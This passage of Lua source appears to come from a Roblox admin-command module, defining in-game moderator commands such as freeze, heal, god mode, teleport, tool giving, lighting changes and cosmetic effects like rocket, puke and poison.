for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
v.Character.Parent = set.Storage
end
end)()
end
end)
 
set.MakeCommand('Gives the target player(s) hat pets, controled using the !pets command.',-1,set.Prefix,{'hatpets'},{'player','number[50 MAX]/destroy'},2,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                if args[2] and args[2]:lower()=='destroy' then
                        local hats=v.Character:FindFirstChild('EpixHatPets')
                        if hats then hats:Destroy() end
                else
                        local num=tonumber(args[2]) or 5
                        if num>50 then num=50 end
                        if v.Character:FindFirstChild('Torso') then
                                local m=v.Character:FindFirstChild('EpixHatPets')
                                local mode
                                local obj
                                local hat
                                if not m then
                                        m=Instance.new('Model',v.Character)
                                        m.Name='EpixHatPets'
                                        table.insert(set.objects,m)
                                        mode=Instance.new('StringValue',m)
                                        mode.Name='Mode'
                                        mode.Value='Follow'
                                        obj=Instance.new('ObjectValue',m)
                                        obj.Name='Target'
                                        obj.Value=v.Character.Torso
                                else
                                        mode=m.Mode
                                        obj=m.Target
                                end
                                for l,h in pairs(v.Character:children()) do if h:IsA('Hat') then hat=h break end end
                                if hat then
                                        for k=1,num do
                                                local cl=hat.Handle:clone()
                                                cl.Name=k
                                                cl.CanCollide=false
                                                cl.Anchored=false
                                                cl.Parent=m
                                                local bpos=Instance.new("BodyPosition",cl)
                                                bpos.Name='bpos'
                                                bpos.position=obj.Value.Position
                                                bpos.maxForce = bpos.maxForce * 10
                                        end
                                end
                                set.Remote(v,'Function','MoveHats')
                        end
                end
        end
end)
 
set.MakeCommand('[NEED HAT PETS TO USE] Makes your hat pets do the specified command (follow/float/swarm/attack)',2,set.AnyPrefix,{'pets'},{'follow/float/swarm/attack','player'},2,function(plr,args)
        local hats=plr.Character:FindFirstChild('EpixHatPets')
        if hats then
                for i,v in pairs(set.GetPlayers(plr,args[2])) do
                        if v.Character:FindFirstChild('Torso') and v.Character.Torso:IsA('Part') then
                                if args[1]:lower()=='follow' then
                                        hats.Mode.Value='Follow'
                                        hats.Target.Value=v.Character.Torso
                                elseif args[1]:lower()=='float' then
                                        hats.Mode.Value='Float'
                                        hats.Target.Value=v.Character.Torso
                                elseif args[1]:lower()=='swarm' then
                                        hats.Mode.Value='Swarm'
                                        hats.Target.Value=v.Character.Torso
                                elseif args[1]:lower()=='attack' then
                                        hats.Mode.Value='Attack'
                                        hats.Target.Value=v.Character.Torso
                                end
                        end
                end
        else
                set.Remote(plr,'Function','OutputGui',"You don't have any hat pets! If you are an admin use the :hatpets command to get some")
        end
end)
 
set.MakeCommand('UnPunishes the target player(s)',2,set.Prefix,{'unpunish'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
v.Character.Parent = game:service("Workspace") v.Character:MakeJoints()
end
end)
 
set.MakeCommand('Freezes the target player(s)',2,set.Prefix,{'freeze'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
for a, obj in pairs(v.Character:children()) do
if obj:IsA("BasePart") then obj.Anchored = true end v.Character.Humanoid.WalkSpeed = 0
end
end
end)()
end
end)
 
set.MakeCommand('UnFreezes the target players, thaws them out',2,set.Prefix,{'thaw','unfreeze'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
for a, obj in pairs(v.Character:children()) do
if obj:IsA("BasePart") then obj.Anchored = false end v.Character.Humanoid.WalkSpeed = 16
end
end
end)()
end
end)
 
set.MakeCommand('Heals the target player(s) (Regens their health)',2,set.Prefix,{'heal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end)()
end
end)
 
set.MakeCommand('Makes the target player(s) immortal, makes their health so high that normal non-explosive weapons can\'t kill them',2,set.Prefix,{'god','immortal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.MaxHealth = math.huge
v.Character.Humanoid.Health = 9e9
end
end)()
end
end)
 
set.MakeCommand('Makes the target player(s) mortal again',2,set.Prefix,{'ungod','mortal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.MaxHealth = 100
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end)()
end
end)
 
set.MakeCommand('Change Ambient',2,set.Prefix,{'ambient'},{'num','num','num'},3,function(plr,args)
game:service('Lighting').Ambient = Color3.new(args[1],args[2],args[3])
end)
 
set.MakeCommand('Change OutdoorAmbient',2,set.Prefix,{'oambient','outdoorambient'},{'num','num','num'},3,function(plr,args)
game:service('Lighting').OutdoorAmbient = Color3.new(args[1],args[2],args[3])
end)
 
set.MakeCommand('Fog Off',2,set.Prefix,{'nofog','fogoff'},{},0,function(plr,args)
game:service('Lighting').FogEnd=1000000000000
end)
 
set.MakeCommand('Determines if shadows are on or off',2,set.Prefix,{'shadows'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
        game:service('Lighting').GlobalShadows=true
elseif args[1]:lower()=='off' then
        game:service('Lighting').GlobalShadows=false
end
end)
 
set.MakeCommand('Determines if outlines are on or off',2,set.Prefix,{'outlines'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
        game:service('Lighting').Outlines=true
elseif args[1]:lower()=='off' then
        game:service('Lighting').Outlines=false
end
end)
 
set.MakeCommand('Repeats <command> for <amount> of times every <interval> seconds',2,set.Prefix,{'repeat','loop'},{'amount','interval','command'},3,function(plr,args)
local amount = tonumber(args[1])
local timer = tonumber(args[2])
if timer<=0 then timer=1 end
local command = args[3]:lower()
local num=0
coroutine.wrap(function()
repeat
set.ProcessCommand(plr,command,true)
wait(timer)
num=num+1
until num==amount
end)()
end)
 
set.MakeCommand('Change Brightness',2,set.Prefix,{'brightness'},{'number'},1,function(plr,args)
game:service('Lighting').Brightness =args[1]
end)
 
set.MakeCommand('Change Time',2,set.Prefix,{'time','timeofday'},{'time'},1,function(plr,args)
game:service('Lighting').TimeOfDay = args[1]
end)
 
set.MakeCommand('Fog Color',2,set.Prefix,{'fogcolor'},{'num','num','num'},3,function(plr,args)
game:service('Lighting').FogColor = Color3.new(args[1],args[2],args[3])
end)
 
set.MakeCommand('Fog Start/End',2,set.Prefix,{'fog'},{'start','end'},2,function(plr,args)
game:service('Lighting').FogEnd = args[2]
game:service('Lighting').FogStart = args[1]
end)
 
set.MakeCommand('Gives the target player(s) basic building tools and the F3X tool',2,set.Prefix,{'btools','buildtools','buildingtools','buildertools'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("Backpack") then
local t1 = Instance.new("HopperBin", v.Backpack) t1.Name = "Move" t1.BinType = "GameTool"
local t2 = Instance.new("HopperBin", v.Backpack) t2.Name = "Clone" t2.BinType = "Clone"
local t3 = Instance.new("HopperBin", v.Backpack) t3.Name = "Delete" t3.BinType = "Hammer"
deps['F3X Building Tools']:Clone().Parent=v.Backpack
local t4 = Instance.new("HopperBin", v.Backpack) t4.Name = "Resize"
local cl=deps.ResizeScript:clone()
cl.Parent=t4
cl.Disabled=false
end
end)()
end
end)
 
set.MakeCommand('Places the desired tool into the target player(s)\'s StarterPack',2,set.Prefix,{'startergive'},{'player','toolname'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("StarterGear") and game:findFirstChild("Lighting") then
for a, tool in pairs(set.Storage:children()) do
if tool:IsA("Tool") or tool:IsA("HopperBin") then
if args[2]:lower() == "all" or tool.Name:lower():find(args[2]:lower()) == 1 then tool:Clone().Parent = v.StarterGear end
end
end
end
end)()
end
end)
 
set.MakeCommand('Gives the target player(s) the desired tool(s)',2,set.Prefix,{'give','tool'},{'player','tool'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
for a, tool in pairs(set.Storage:children()) do
if tool:IsA("Tool") or tool:IsA("HopperBin") then
if args[2]:lower() == "all" or tool.Name:lower():sub(1,#args[2])==args[2]:lower() then
        tool:clone().Parent = v.Backpack
end
end
end
end)()
end
end)
 
set.MakeCommand('Steals player1\'s tools and gives them to player2',2,set.Prefix,{'steal','stealtools'},{'player1','player2'},2,function(plr,args)
local p1 = set.GetPlayers(plr, args[1]:lower())
local p2 = set.GetPlayers(plr, args[2]:lower())
coroutine.wrap(function()
for i,v in pairs(p1) do
        coroutine.wrap(function()
        for k,m in pairs(p2) do
                for j,n in pairs(v.Backpack:children()) do
                        print(n.Name)
                        local b=n:clone()
                        n.Parent=m.Backpack
                end
        end
        v.Backpack:ClearAllChildren()
        end)()
end
end)()
end)
 
set.MakeCommand('Remove the target player(s)\'s screen guis',2,set.Prefix,{'removeguis','noguis'},{'player'},1,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                set.Remote(v,'Function','RemoveGuis')
        end
end)
 
set.MakeCommand('Remove the target player(s)\'s tools',2,set.Prefix,{'removetools','notools'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v:findFirstChild("Backpack") then
for a, tool in pairs(v.Character:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
for a, tool in pairs(v.Backpack:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
end
end)()
end
end)
 
set.MakeCommand('Shows you what rank the target player(s) are in the group specified by groupID',2,set.Prefix,{'rank','getrank'},{'player','groupID'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:IsInGroup(args[2]) then
set.Hint("[" .. v:GetRankInGroup(args[2]) .. "] " .. v:GetRoleInGroup(args[2]), {plr})
elseif v and not v:IsInGroup(args[2])then
set.Hint(v.Name .. " is not in the group " .. args[2], {plr})
end
end)()
end
end)
 
set.MakeCommand('Removes <number> HP from the target player(s)',2,set.Prefix,{'damage','hurt'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid:TakeDamage(args[2])
end
end)()
end
end)
 
set.MakeCommand('Makes the target player(s)\'s gravity normal',2,set.Prefix,{'grav','bringtoearth'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
end
end)()
end
end)
 
set.MakeCommand('Set the target player(s)\'s gravity',2,set.Prefix,{'setgrav','gravity','setgravity'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(0,0,0)
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") then frc.force = frc.force - Vector3.new(0,prt:GetMass()*tonumber(args[2]),0) elseif prt:IsA("Hat") then frc.force = frc.force - Vector3.new(0,prt.Handle:GetMass()*tonumber(args[2]),0) end end
end
end)()
end
end)
 
set.MakeCommand('NoGrav the target player(s)',2,set.Prefix,{'nograv','nogravity','superjump'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(0,0,0)
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") then frc.force = frc.force + Vector3.new(0,prt:GetMass()*196.25,0) elseif prt:IsA("Hat") then frc.force = frc.force + Vector3.new(0,prt.Handle:GetMass()*196.25,0) end end
end
end)()
end
end)
 
set.MakeCommand('Set the target player(s)\'s health to <number>',2,set.Prefix,{'health','sethealth'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.MaxHealth = args[2]
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end)()
end
end)
 
set.MakeCommand('Set the target player(s)\'s WalkSpeed to <number>',2,set.Prefix,{'speed','setspeed','walkspeed'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.WalkSpeed = args[2]
end
end)()
end
end)
 
set.MakeCommand('Set the target player(s)\'s team to <team>',2,set.Prefix,{'team','setteam','changeteam'},{'player','team'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and game:findFirstChild("Teams") then
for a, tm in pairs(game.Teams:children()) do
if tm.Name:lower():find(args[2]:lower()) == 1 then v.TeamColor = tm.TeamColor end
end
end
end)()
end
end)
 
set.MakeCommand('Set the target player(s)\'s field of view to <number> (min 1, max 120)',-1,set.Prefix,{'fov','fieldofview'},{'player','number'},2,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr, args[1])) do
                set.Remote(v,'Function','FieldOfView',args[2])
        end
end)
 
set.MakeCommand('Teleport the target player(s) to the place belonging to <placeID>',2,set.Prefix,{'place'},{'player','placeID'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
set.PromptPlaceTeleport(v,"Teleport to "..args[2].."?",args[2])
end)()
end
end)
 
set.MakeCommand('Teleport player1(s) to player2, a waypoint, or specific coords, use :tp player1 waypoint-WAYPOINTNAME to use waypoints, x,y,z for coords',2,set.Prefix,{'tp','teleport'},{'player1','player2'},2,function(plr,args)
if args[2]:match('^waypoint%-(.*)') then
        local m=args[2]:match('^waypoint%-(.*)')
        local point
        for i,v in pairs(set.Waypoints) do
                if i:lower():sub(1,#m)==m:lower() then
                        point=v
                end
        end
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                if point then
                        v.Character:MoveTo(point)
                end
        end
        if not point then set.Hint('Waypoint '..m..' was not found.',{plr}) end
elseif args[2]:find(',') then
        local x,y,z=args[2]:match('(.*),(.*),(.*)')
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                v.Character:MoveTo(Vector3.new(tonumber(x),tonumber(y),tonumber(z)))
        end
else
        local plrz = set.GetPlayers(plr, args[1]:lower())
        local plrz2 = set.GetPlayers(plr, args[2]:lower())
        for i, v in pairs(plrz) do
        coroutine.wrap(function()
        for i2, v2 in pairs(plrz2) do
        if v and v2 and v.Character and v2.Character and v.Character:FindFirstChild('Humanoid') and v.Character:findFirstChild("Torso") and v2.Character:findFirstChild("Torso") then
        if v.Character.Humanoid.Sit==true then
        v.Character.Humanoid.Sit=false
        wait(0.5)
        end
        v.Character.Torso.CFrame = v2.Character.Torso.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1))
        end
        end
        end)()
        end
end
end)
 
set.MakeCommand('Teleport the target player(s) up by <height> studs',-1,set.Prefix,{'freefall','skydive'},{'player','height'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character:FindFirstChild('Torso') then
v.Character.Torso.CFrame=v.Character.Torso.CFrame+Vector3.new(0,tonumber(args[2]),0)
end
end)()
end
end)
 
set.MakeCommand('Change the target player(s)\'s leader stat <stat> value to <value>',2,set.Prefix,{'change','leaderstat','stat'},{'player','stat','value'},3,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("leaderstats") then
for a, st in pairs(v.leaderstats:children()) do
if st.Name:lower():find(args[2]:lower()) == 1 then st.Value = args[3] end
end
end
end)()
end
end)
 
set.MakeCommand('Give the target player(s) the shirt that belongs to <id>',2,set.Prefix,{'shirt','giveshirt'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
for g,k in pairs(v.Character:children()) do
if k:IsA("Shirt") then k:Destroy() end
end
local s=Instance.new('Shirt',v.Character)
s.ShirtTemplate="http://www.roblox.com/asset/?id="..args[2]
end
end)()
end
end)
 
set.MakeCommand('Give the target player(s) the pants that belongs to <id>',2,set.Prefix,{'pants','givepants'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
for g,k in pairs(v.Character:children()) do
if k:IsA("Pants") then k:Destroy() end
end
local s=Instance.new('Pants',v.Character)
s.PantsTemplate="http://www.roblox.com/asset/?id="..args[2]
end
end)()
end
end)
 
set.MakeCommand('Give the target player(s) the face that belongs to <id>',2,set.Prefix,{'face','giveface'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if not v.Character:FindFirstChild("Head") then return end
if v and v.Character and v.Character:findFirstChild("Head") and v.Character.Head:findFirstChild("face") then
v.Character.Head:findFirstChild("face"):Destroy()--.Texture = "http://www.roblox.com/asset/?id=" .. args[2]
end
game:service('InsertService'):LoadAsset(tonumber(args[2])):children()[1].Parent=v.Character:FindFirstChild("Head")
end)()
end
end)
 
set.MakeCommand('Swag the target player(s) up',-1,set.Prefix,{'swagify','swagger'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
for i,v in pairs(v.Character:children()) do
if v.Name == "Shirt" then local cl = v:Clone() cl.Parent = v.Parent cl.ShirtTemplate = "http://www.roblox.com/asset/?id=109163376" v:Destroy() end
if v.Name == "Pants" then local cl = v:Clone() cl.Parent = v.Parent cl.PantsTemplate = "http://www.roblox.com/asset/?id=109163376" v:Destroy() end
end
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
set.Cape(v,'Fabric','Pink',109301474)
end
end)()
end
end)
 
set.MakeCommand('Send the target player(s) to the moon!',-1,set.Prefix,{'rocket','firework'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
if v.Character and v.Character:FindFirstChild("Torso") then
delay(0,function()
local speed = 10
local Part = Instance.new("Part")
Part.Parent = v.Character
local SpecialMesh = Instance.new("SpecialMesh")
SpecialMesh.Parent = Part
SpecialMesh.MeshId = "http://www.roblox.com/asset/?id=2251534"
SpecialMesh.MeshType = "FileMesh"
SpecialMesh.TextureId = "43abb6d081e0fbc8666fc92f6ff378c1"
SpecialMesh.Scale = Vector3.new(0.5,0.5,0.5)
local Weld = Instance.new("Weld")
Weld.Parent = Part
Weld.Part0 = Part
Weld.Part1 = v.Character.Torso
Weld.C0 = CFrame.new(0,-1,0)*CFrame.Angles(-1.5,0,0)
local BodyVelocity = Instance.new("BodyVelocity")
BodyVelocity.Parent = Part
BodyVelocity.maxForce = Vector3.new(math.huge,math.huge,math.huge)
BodyVelocity.velocity = Vector3.new(0,10*speed,0)
delay(0,function()
for i = 1,math.huge do
local Explosion = Instance.new("Explosion")
Explosion.Parent = Part
Explosion.BlastRadius = 0
Explosion.Position = Part.Position + Vector3.new(0,0,0)
wait()
end
end)        
wait(3)
pcall(function()
BodyVelocity:remove()
Instance.new("Explosion",workspace).Position=v.Character.Torso.Position
v.Character:BreakJoints()
end)
end)
end
end)()
end
end)
 
set.MakeCommand('Make the target player(s) dance',-1,set.Prefix,{'dance'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
        set.Remote(v,'Function','Effect','dance')
end
end)
 
set.MakeCommand('Make the target player(s) break dance',-1,set.Prefix,{'breakdance','fundance','lolwut'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
local color
local num=math.random(1,7)
if num==1 then
color='Really blue'
elseif num==2 then
color='Really red'
elseif num==3 then
color='Magenta'
elseif num==4 then
color='Lime green'
elseif num==5 then
color='Hot pink'
elseif num==6 then
color='New Yeller'
elseif num==7 then
color='White'
end
local hum=v.Character:FindFirstChild('Humanoid')
if not hum then return end
set.Remote(v,'Function','Effect','dance')
set.ProcessCommand(plr,set.Prefix.."batch"..set.SplitKey..set.Prefix.."sparkles"..set.SplitKey..v.Name..set.SplitKey..color..set.BatchSplit..set.Prefix.."fire"..set.SplitKey..v.Name..set.SplitKey..color..set.BatchSplit..set.Prefix.."nograv"..set.SplitKey..v.Name..set.BatchSplit..set.Prefix.."smoke"..set.SplitKey..v.Name..set.SplitKey..color..set.BatchSplit..set.Prefix.."spin"..set.SplitKey..v.Name)
repeat hum.PlatformStand=true wait() until not hum or hum==nil or hum.Parent==nil
end)()
end
end)
 
set.MakeCommand('Make the target player(s) puke',-1,set.Prefix,{'puke','barf','throwup','vomit'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1])) do
coroutine.wrap(function()
if (not v:IsA('Player')) or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head')) or v.Character:FindFirstChild('Kohls Puke') then return end
local run=true
local k=Instance.new('StringValue',v.Character)
k.Name='Kohls Puke'
coroutine.wrap(function()
repeat
wait(0.15)
local p = Instance.new("Part",v.Character)
p.CanCollide = false
local color = math.random(1, 3)
local bcolor
if color == 1 then
bcolor = BrickColor.new(192)
elseif color == 2 then
bcolor = BrickColor.new(28)
elseif color == 3 then
bcolor = BrickColor.new(105)
end
p.BrickColor = bcolor
local m=Instance.new('BlockMesh',p)
p.Size=Vector3.new(0.1,0.1,0.1)
m.Scale = Vector3.new(math.random()*0.9, math.random()*0.9, math.random()*0.9)
p.Locked = true
p.TopSurface = "Smooth"
p.BottomSurface = "Smooth"
p.CFrame = v.Character.Head.CFrame * CFrame.new(Vector3.new(0, 0, -1))
p.Velocity = v.Character.Head.CFrame.lookVector * 20 + Vector3.new(math.random(-5, 5), math.random(-5, 5), math.random(-5, 5))
p.Anchored = false
m.Name='Puke Peice'
p.Name='Puke Peice'
p.Touched:connect(function(o)
if o and p and (not game:service('Players'):FindFirstChild(o.Parent.Name)) and o.Name~='Puke Peice' and o.Name~='Blood Peice' and o.Name~='Blood Plate' and o.Name~='Puke Plate' and (o.Parent.Name=='Workspace' or o.Parent:IsA('Model')) and (o.Parent~=p.Parent) and o:IsA('Part') and (o.Parent.Name~=v.Character.Name) and (not o.Parent:IsA('Hat')) and (not o.Parent:IsA('Tool')) then
        local cf=CFrame.new(p.CFrame.X,o.CFrame.Y+o.Size.Y/2,p.CFrame.Z)
        p:Destroy()
        local g=Instance.new('Part',workspace)
        g.Anchored=true
        g.CanCollide=false
        g.Size=Vector3.new(0.1,0.1,0.1)
        g.Name='Puke Plate'
        g.CFrame=cf
        g.BrickColor=BrickColor.new(119)
        local c=Instance.new('CylinderMesh',g)
        c.Scale=Vector3.new(1,0.2,1)
        c.Name='PukeMesh'
        wait(10)
        g:Destroy()
elseif o and o.Name=='Puke Plate' and p then
        p:Destroy()
        o.PukeMesh.Scale=o.PukeMesh.Scale+Vector3.new(0.5,0,0.5)
end
end)
until run==false or not k or not k.Parent or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head'))
end)()
wait(10)
run=false
k:Destroy()
end)()
end
end)
 
set.MakeCommand('Make the target player(s) bleed',-1,set.Prefix,{'cut','stab','shank'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
if (not v:IsA('Player')) or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head')) or v.Character:FindFirstChild('Kohls Bleed') then return end
local run=true
local k=Instance.new('StringValue',v.Character)
k.Name='Kohls Bleed'
coroutine.wrap(function()
repeat
wait(0.15)
v.Character.Humanoid.Health=v.Character.Humanoid.Health-1
local p = Instance.new("Part",v.Character)
p.CanCollide = false
local color = math.random(1, 3)
local bcolo
if color == 1 then
bcolor = BrickColor.new(21)
elseif color == 2 then
bcolor = BrickColor.new(1004)
elseif color == 3 then
bcolor = BrickColor.new(21)
end
p.BrickColor = bcolor
local m=Instance.new('BlockMesh',p)
p.Size=Vector3.new(0.1,0.1,0.1)
m.Scale = Vector3.new(math.random()*0.9, math.random()*0.9, math.random()*0.9)
p.Locked = true
p.TopSurface = "Smooth"
p.BottomSurface = "Smooth"
p.CFrame = v.Character.Torso.CFrame * CFrame.new(Vector3.new(2, 0, 0))
p.Velocity = v.Character.Head.CFrame.lookVector * 1 + Vector3.new(math.random(-1, 1), math.random(-1, 1), math.random(-1, 1))
p.Anchored = false
m.Name='Blood Peice'
p.Name='Blood Peice'
p.Touched:connect(function(o)
if o and p and (not game:service('Players'):FindFirstChild(o.Parent.Name)) and o.Name~='Blood Peice' and o.Name~='Puke Peice' and o.Name~='Puke Plate' and o.Name~='Blood Plate' and (o.Parent.Name=='Workspace' or o.Parent:IsA('Model')) and (o.Parent~=p.Parent) and o:IsA('Part') and (o.Parent.Name~=v.Character.Name) and (not o.Parent:IsA('Hat')) and (not o.Parent:IsA('Tool')) then
        local cf=CFrame.new(p.CFrame.X,o.CFrame.Y+o.Size.Y/2,p.CFrame.Z)
        p:Destroy()
        local g=Instance.new('Part',workspace)
        g.Anchored=true
        g.CanCollide=false
        g.Size=Vector3.new(0.1,0.1,0.1)
        g.Name='Blood Plate'
        g.CFrame=cf
        g.BrickColor=BrickColor.new(21)
        local c=Instance.new('CylinderMesh',g)
        c.Scale=Vector3.new(1,0.2,1)
        c.Name='BloodMesh'
        wait(10)
        g:Destroy()
elseif o and o.Name=='Blood Plate' and p then
        p:Destroy()
        o.BloodMesh.Scale=o.BloodMesh.Scale+Vector3.new(0.5,0,0.5)
end
end)
until run==false or not k or not k.Parent or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head'))
end)()
wait(10)
run=false
k:Destroy()
end)()
end
end)
 
set.MakeCommand('Shows you the number of player points left in the game',5,set.Prefix,{'points','getpoints'},{},0,function(plr,args)
        set.Hint('Available Player Points: '..game:GetService("PointsService"):GetAwardablePoints(),{plr})
end)
 
set.MakeCommand('Lets you give <player> <amount> player points',5,set.Prefix,{'givepoints','sendpoints'},{'player','amount'},2,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
                local ran,failed=ypcall(function() game:GetService("PointsService"):AwardPoints(v.userId,tonumber(args[2])) end)
                if ran and game:GetService("PointsService"):GetAwardablePoints()>=tonumber(args[2]) then
                        set.Hint('Gave '..args[2]..' points to '..v.Name,{plr})
                elseif game:GetService("PointsService"):GetAwardablePoints()<tonumber(args[2])then
                        set.Hint("You don't have "..args[2]..' points to give to '..v.Name,{plr})
                else
                        set.Hint("(Unknown Error) Failed to give "..args[2]..' points to '..v.Name,{plr})
                end
                set.Hint('Available Player Points: '..game:GetService("PointsService"):GetAwardablePoints(),{plr})
        end
end)
 
set.MakeCommand('Slowly kills the target player(s)',-1,set.Prefix,{'poison'},{'player'},1,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
                local torso=v.Character:FindFirstChild('Torso')
                local larm=v.Character:FindFirstChild('Left Arm')
                local rarm=v.Character:FindFirstChild('Right Arm')
                local lleg=v.Character:FindFirstChild('Left Leg')
                local rleg=v.Character:FindFirstChild('Right Leg')
                local head=v.Character:FindFirstChild('Head')
                local hum=v.Character:FindFirstChild('Humanoid')
                if torso and larm and rarm and lleg and rleg and head and hum and not v.Character:FindFirstChild('KohlsPoisoned') then
                        local poisoned=Instance.new('BoolValue',v.Character)
                        poisoned.Name='KohlsPoisoned'
                        poisoned.Value=true
                        local tor=torso.BrickColor
                        local lar=larm.BrickColor
                        local rar=rarm.BrickColor
                        local lle=lleg.BrickColor
                        local rle=rleg.BrickColor
                        local hea=head.BrickColor
                        torso.BrickColor=BrickColor.new('Br. yellowish green')
                        larm.BrickColor=BrickColor.new('Br. yellowish green')
                        rarm.BrickColor=BrickColor.new('Br. yellowish green')
                        lleg.BrickColor=BrickColor.new('Br. yellowish green')
                        rleg.BrickColor=BrickColor.new('Br. yellowish green')
                        head.BrickColor=BrickColor.new('Br. yellowish green')
                        local run=true
                        coroutine.wrap(function() wait(10) run=false end)()
                        repeat
                                wait(1)
                                hum.Health=hum.Health-5
                        until (not poisoned) or (not poisoned.Parent) or (not run)
                        if poisoned and poisoned.Parent then
